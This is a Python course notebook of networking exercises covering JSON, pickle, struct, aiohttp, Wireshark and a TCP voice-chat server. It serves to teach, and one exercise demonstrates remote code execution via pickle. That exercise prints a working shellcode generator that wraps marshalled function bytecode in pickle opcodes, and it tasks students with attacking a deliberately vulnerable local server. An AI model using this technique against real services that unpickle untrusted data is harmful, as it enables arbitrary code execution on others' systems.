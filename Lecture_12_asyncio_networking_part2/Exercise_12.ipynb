{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# $\\mu$-Exercises"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 0) Refresher (lab automation)\n",
    "Describe in your own words the principles of communicating with a laboratory instrument. In particular, mention the mainstream interfaces, the way you can communicate with them using Python, the role of `sockets`, the language used to communicate with instruments, and the most important syntax rules.\n",
    "\n",
    "Write your answer here (double-click to edit): ..."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 1) Serialization with JSON\n",
    "Deserialize the `json_string` string using the `json` module."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "json_string = '[1, 2, 3]'\n",
    "\n",
    "# STUDENT TASK: Use the `json` module to turn the `json_string` string into a list.\n",
    "# Hint: Don't forget the import.\n",
    "...\n",
    "l = ...\n",
    "\n",
    "# Check if the outcome is right.\n",
    "assert l == [1, 2, 3]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 2) Serialization with `pickle`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pickle\n",
    "\n",
    "data = {\"aNumber\": 1234, \"aSet\": {1, 2, 3}}\n",
    "\n",
    "# STUDENT TASK: \n",
    "# 1) Try to serialize `data` using `json`. Why does it fail?\n",
    "# 2) Serialize `data` using `pickle`, store the result in `mu_ex2.dat`.\n",
    "# 3) Load the data again from the file and deserialize it.\n",
    "\n",
    "# Hint: use the `pickle.dump` and `pickle.load` functions which allow to write\n",
    "# and read directly to or from a file.\n",
    "# They both take an open file handle as the second argument.\n",
    "# Use `open(\"myFilename\", \"wb\")` to open a file for writing in binary mode.\n",
    "# Use \"rb\" for opening a file for reading in binary mode.\n",
    "...\n",
    "\n",
    "# Check if the deserialized data is correct.\n",
    "assert data_deserialized == data"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 3) HTTP GET - Load search suggestions\n",
    "\n",
    "Search engines often provide search suggestions while the user is typing.\n",
    "Startpage.com allows to get search suggestions in the JSON format. As an example the search suggestions for the input `pyth` can be retrieved with the following URL:\n",
    "\n",
    "https://www.startpage.com/do/suggest?limit=10&lang=english&format=json&query=pyth\n",
    "\n",
    "Use `aiohttp` to fetch and display search suggestions of a user input."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Fetch the search suggestions of startpage.com.\n",
    "\n",
    "import aiohttp\n",
    "import json\n",
    "\n",
    "# Ask the user for an input.\n",
    "print(\"Enter a query string:\")\n",
    "query = input()\n",
    "\n",
    "# STUDENT TASK: Create the correct `url` and `params` variables.\n",
    "url = ...\n",
    "params = ...\n",
    "\n",
    "async with aiohttp.ClientSession() as session:\n",
    "    async with session.get(url, params=params) as resp: # Send a get request\n",
    "        print(\"HTTP status:\", resp.status)\n",
    "        \n",
    "        # Wait for the data to arrive.\n",
    "        json_text = await resp.text()\n",
    "        \n",
    "        # Parse the JSON.\n",
    "        search_suggestions = json.loads(json_text)\n",
    "        \n",
    "        print(f\"Search suggestions for {query}:\")\n",
    "        print(search_suggestions[1])\n",
    "        "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 4) Simple HTTP web server\n",
    "Create an HTTP web server that displays the current time."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "from aiohttp import web\n",
    "import time\n",
    "\n",
    "# Hint: use time.asctime()\n",
    "# Copy and simplify the HTTP server code of the lecture here!\n",
    "\n",
    "..."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Exercise 1 - Serialize data with `struct`\n",
    "\n",
    "`struct` can be used to convert between Python values and C-like structs which are represented as byte strings. This also allows to serialize base types in a compact way. `struct` provides two functions `pack()` and `unpack()` for serialization and deserialization. The format of the data to be serialized is specified with *format strings*.\n",
    "\n",
    "For example to serialize a number as a 32-bit float and another number as a 8-bit *signed* integer the following code can be used:\n",
    "\n",
    "(For more information see https://docs.python.org/3/library/struct.html. Especially check out the table on format characters https://docs.python.org/3/library/struct.html#format-characters)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import struct\n",
    "\n",
    "fmt = \"fB\" # 'f' stands for 32-bit float, 'B' stands for unsigned char/byte.\n",
    "serialized = struct.pack(fmt, 1.23, 42)\n",
    "print(\"serialized =\", serialized)\n",
    "\n",
    "# 32 bits + 8 bits should be exactly 5 bytes.\n",
    "assert len(serialized) == 5\n",
    "\n",
    "the_float, the_int = struct.unpack(fmt, serialized)\n",
    "print(\"deserialized result:\", the_float, the_int) # Notice the error in the float value due to the rounding."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# STUDENT TASK: 'pack' the number '1' into bytes\n",
    "# once as a 32-bit integer with little-endian byte order\n",
    "# and once with big-endian byte order.\n",
    "# Print the results and notice the difference.\n",
    "\n",
    "..."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Exercise 2 - Inspecting network traffic with Wireshark\n",
    "\n",
    "This task is recommended but *optional*. The purpose is to briefly introduce the *Wireshark* program.\n",
    "\n",
    "Network traffic on your computer can be intercepted for inspection. This is a useful tool for debugging if something goes wrong. A well known program for this purpose is *Wireshark* (https://www.wireshark.org/).\n",
    "Wireshark basically records network packets and displays them in a list. Additionally it allows to filter for and search for certain packets and to inspect the packet content.\n",
    "\n",
    "Install Wireshark on your computer. Linux users can usually install wireshark from the package manager, it is often called 'wireshark-gtk' or 'wireshark-qt'. Windows and OSX users can find installable packages on the official website.\n",
    "\n",
    "Run Wireshark. It might require admin/root privileges.\n",
    "\n",
    "Wireshark allows you to select the network interface. On your laptop there might be multiple ones (wifi, ethernet, vpn). If you are not sure what to choose, select 'any' to see all traffic. Click on 'start' after selecting the network interface.\n",
    "\n",
    "Soon there should be network packets on the display. Let's filter the packets such that we only see IP packets from or to `httpbin.org`.\n",
    "\n",
    "In the *Filter* input enter: `ip.host==httpbin.org`\n",
    "\n",
    "Now the list of packets should be empty.\n",
    "\n",
    "To get some data, execute the following *unencrypted* (http without *s*) query to 'httpbin.org'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import aiohttp\n",
    "\n",
    "url = \"http://httpbin.org/get\"\n",
    "\n",
    "async with aiohttp.ClientSession() as session:\n",
    "    async with session.get(url) as resp:\n",
    "        print(\"HTTP status:\", resp.status)\n",
    "        print(\"Response:\", await resp.text())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Try to make sense of what you see.\n",
    "\n",
    "A useful way to inspect a TCP stream is: *right-click on a packet* -> *Follow TCP Stream*."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Exercise 3 - Remote code execution with Pickle\n",
    "\n",
    "As mentioned in the lecture `pickle` is dangerous to use. This exercise will illustrate how `pickle.loads` can be forced to execute arbitrary code.\n",
    "\n",
    "This exercise can be completed without understanding of the pickle language therefore the following subsection is considered optional.\n",
    "\n",
    "This exercise is largely inspired by https://checkoway.net/musings/pickle/, though adapted for Python 3."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Understanding the pickle format (optional)\n",
    "\n",
    "Pickled data is actually a program for a *stack machine* (https://en.wikipedia.org/wiki/Stack_machine). The `pickle.loads()` function executes this program. The pickle language consists of very few commands outlined here.\n",
    "\n",
    "(This has been copied from https://checkoway.net/musings/pickle/)\n",
    "\n",
    "* `c`: Read to the newline as the module name, `module`. Read the next line as the object name, `object`. Push `module.object` onto the stack.\n",
    "* `(`: Insert a marker object onto the stack. This can be used to select a section of the stack for further operations.\n",
    "* `t`: Pop (take out of the stack in a last-in-first-out manner) objects off the stack until a `(` is popped and create a tuple object containing the objects popped (except for the `()` in the order they were pushed onto the stack. The tuple is pushed onto the stack\n",
    "* `S`: Read the string in quotes up to the newline and push it onto the stack.\n",
    "* `R`: Pop a tuple and a callable off the stack and call the callable with the tuple as arguments. Push the result onto the stack.\n",
    "* `.`: End of the pickle.\n",
    "\n",
    "The following code shows a byte string that will force `pickle.loads()` to execute the function `__builtin__.print` with the argument `\"Hello!\"`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pickle\n",
    "\n",
    "# 'shellcode' is traditionally a piece of data that can be used\n",
    "# to exploit a vulnerability in a program and give access to the *shell*\n",
    "# on the victim computer.\n",
    "# Here we only let the victim print \"Hello!\" for simplicity.\n",
    "\n",
    "shellcode = b\"\"\"c__builtin__\n",
    "print\n",
    "(S'Hello!'\n",
    "tR.\"\"\"\n",
    "\n",
    "# This shellcode will do the following.\n",
    "# At the beginning the stack is empty:\n",
    "#  Stack = []\n",
    "# 1. Push `__builtin__.print` onto the stack.\n",
    "#  Now the stack is:\n",
    "#  Stack = [__builtin__.print]\n",
    "# 2. Push `\"Hello!\"` onto the stack.\n",
    "#  Stack = [__builtin__.print, \"Hello!\"]\n",
    "# 3. Create a tuple `(\"Hello!\", )` and push it on the stack.\n",
    "#  Stack = [__builtin__.print, (\"Hello!\", )]\n",
    "# 4. Call `__builtin__.print` with content of the tuple as arguments.\n",
    "#  Stack = []\n",
    "\n",
    "pickle.loads(shellcode)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Creating shellcode\n",
    "\n",
    "Understanding the details of this section is optional. The only function `create_shellcode()` will be used for the task.\n",
    "\n",
    "*Shellcode* is traditionally a piece of data that can be used to exploit a vulnerability in a program and give access to the *shell* (like `bash` or `sh` in the terminal) on the victim computer.\n",
    "\n",
    "Since Python can execute shell commands (`os.system()`) being able to run arbitrary Python code is equivalent to unconstrained access to the terminal.\n",
    "\n",
    "The following code converts a function `payload` into *shellcode*, i.e. a byte string that will execute the `payload` function when it is processed by `pickle.loads`.\n",
    "\n",
    "First we need a way to serialize and deserialize functions. `pickle` does not support serializing functions, therefore the serialization package `marshal` will be used for this as shown in the following code."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import types\n",
    "import marshal\n",
    "\n",
    "def payload():\n",
    "    \"\"\"\n",
    "    This function shall be serialized.\n",
    "    \"\"\"\n",
    "    print(\"Hello, I am the payload function!\")\n",
    "    \n",
    "# Serialize the code of the payload function.\n",
    "code_enc = marshal.dumps(payload.__code__)\n",
    "\n",
    "# Deserialize the payload function.\n",
    "deserialized_function = (types.FunctionType(marshal.loads(code_enc), globals(), ''))\n",
    "# Execute the deserialized function.\n",
    "deserialized_function()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Create shellcode that will execute the `payload` function in the exploited program.\n",
    "# Understanding the shellcode is optional.\n",
    "# This was inspired by: https://checkoway.net/musings/pickle/\n",
    "\n",
    "import marshal\n",
    "import base64\n",
    "\n",
    "def payload():\n",
    "    \"\"\"\n",
    "    This is the code that will be executed during deserialization with pickle.\n",
    "    \"\"\"\n",
    "    print(\"You have been hacked!\")\n",
    "\n",
    "def create_shellcode(payload_function) -> bytes:\n",
    "    # Serialize the code of the payload function.\n",
    "    byte_code = marshal.dumps(payload.__code__)\n",
    "\n",
    "    # Encode the byte code as Base64.\n",
    "    # Base64 allows to represent arbitrary bytes as printable ASCII characters.\n",
    "    byte_code_base64 = base64.b64encode(byte_code)\n",
    "\n",
    "    shellcode = b\"\"\"ctypes\n",
    "FunctionType\n",
    "(cmarshal\n",
    "loads\n",
    "(cbase64\n",
    "b64decode\n",
    "(S'%s'\n",
    "tRtRc__builtin__\n",
    "globals\n",
    "(tRS''\n",
    "tR(tR.\"\"\" % byte_code_base64\n",
    "    \n",
    "    return shellcode\n",
    "\n",
    "shellcode = create_shellcode(payload)\n",
    "\n",
    "print(shellcode)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Feed the shellcode to the vulnerable function.\n",
    "# This will execute the payload function.\n",
    "# Notice that the shellcode is just a byte string,\n",
    "# therefore it can be send over the network or be used to contaminate a file.\n",
    "pickle.loads(shellcode)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Student task\n",
    "The file `01_vulnerable_tcp_server.py` contains code for a server that reads a serialized object from the network and deserializes it. Study and run the server script. Then write code that sends a dict which is serialized with `pickle.dumps()`. Then modify your code in order to hack the server."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "# STUDENT TASK\n",
    "# Connect to the TCP server on localhost:12345 and send it a serialized dict (with `pickle`).\n",
    "# Hint: Consult the async client script in the folder of Lecture 10.\n",
    "# Use `pickle.dumps()` to serialize the dict.\n",
    "\n",
    "..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# STUDENT TASK: Modify your solution from above to send malicious shellcode instead of an\n",
    "# encoded dict.\n",
    "# Hint: Use `create_shellcode` to convert a function into shellcode bytes.\n",
    "\n",
    "..."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Exercise 4 - Voice over TCP/IP\n",
    "\n",
    "The goal of this exercise is to create a client and a server script for voice calls over the internet. An example in the simplest form is already available in the files `04_01_audio_client.py` and `04_01_audio_echo_server.py`. The client script connects to a TCP server. Once the connection is open the client reads audio data from the microphone and sends the audio data to the server. The server will simply send the audio back to the client. The client interprets all incoming data as an audio signal and forwards it to the speaker.\n",
    "\n",
    "The client code uses the Python package `pyaudio` for recording and playing sound. Make sure it is installed.\n",
    "\n",
    "## Task 4.1\n",
    "Study the two scripts and run them. The goal is to hear your own echo.\n",
    "The following tasks will build up onto these scripts.\n",
    "\n",
    "## Task 4.2\n",
    "Instead of sending the audio signal back to where it came from it should now be sent to all other open connections such that all connected users can hear each other. The `04_audio_client.py` does not have to be changed, instead all the modifications should happen in the file `04_2_audio_server.py` which already contains a few hints. Student tasks are all marked with `STUDENT TASK`.\n",
    " \n",
    "It might be helpful to refresh the chat server exercise of Lecture 10 (Exercise 1).\n",
    "\n",
    "The chat server from the lecture 10 simply forwarded messages to all other connected clients. This is different for the voice call server: Instead of forwarding independent audio signals the server should mix all individual signals together. More precisely, the server should send back the *sum* of all signals. This reduces bandwidth usage and also makes it possible to reuse the same client script.\n",
    "\n",
    "## Task 4.2.1 (optional)\n",
    "Use the scripts to have a chat with your colleagues. For this the server must be accessible to all parties. One possibility is to run the server script on one of the Tardis computers. The clients must be run on the *local* computers in order to access microphone and speaker. Because the Tardis computers are not accessible from the public internet use an *SSH Tunnel* to *tunnel* the connection from your computer to the server on the Tardis machine.\n",
    "\n",
    "Make sure you are connected to the ETHZ VPN.\n",
    "```sh\n",
    "ssh NETHZUSERNAME@tardis-c07.ee.ethz.ch\n",
    "\n",
    "# Load anaconda.\n",
    "source /usr/pack/anaconda-3-fg/anaconda3_env.sh\n",
    "\n",
    "# Upload somehow the server script. For example,\n",
    "# copy-paste it using the `nano` text editor.\n",
    "\n",
    "# Run the server script.\n",
    "python3 serverscript.py --port 1234\n",
    "```\n",
    "\n",
    "Or alternatively:\n",
    "```sh\n",
    "# This is a hack to upload and execute the script on a tardis machine in one line.\n",
    "cat 04_02_audio_server.py | ssh NETHZUSERNAME@tardis-c07.ee.ethz.ch \"cat > /tmp/server.py && source /usr/pack/anaconda-3-fg/anaconda3_env.sh && python3 /tmp/server.py --port 1234; rm /tmp/server.py\"\n",
    "```\n",
    "\n",
    "Create an SSH tunnel from another terminal:\n",
    "```\n",
    "ssh -L localhost:1234:tardis-c07:1234 NETHZUSERNAME@tardis-c07.ee.ethz.ch\n",
    "```\n",
    "\n",
    "Now you can connect to the server on the Tardis as it would be running locally.\n",
    "```\n",
    "python3 clientscript.py --server localhost --port 1234\n",
    "```\n",
    "\n",
    "You can now either launch two instances of the client script or try to connect to the same server with other colleagues.\n",
    "\n",
    "### Renting a cheap server\n",
    "A more professional solution to run the voice call server is to have either a computer that is accessible from the internet or  to rent a virtual private server (VPS). There are many hosting providers. For example a cheap and easy solution can be found on https://www.scaleway.com (requires a credit card, prepaid credit cards also work).\n",
    "\n",
    "## Task 4.3 (optional)\n",
    "Extend the server and the client code to support *rooms*. Users should only hear other users in the same room, not everybody else.\n",
    "Proceed as follows:\n",
    "* Create copies of the client and server code you used in the previous task. If you could not complete the previous task or need more hints: use the files `04_03_audio_client.py` and `04_03_audio_server.py` instead.\n",
    "* The client should transmit the room name as a line terminated by `\\n` at the very beginning of the connection. This implies that also the server reads a full line before reading audio frames.\n",
    "* On the server create a dict that holds `AudioMixer` objects for each of the room names. When a client connects to the server the right audio mixer should be chosen based on the room name."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
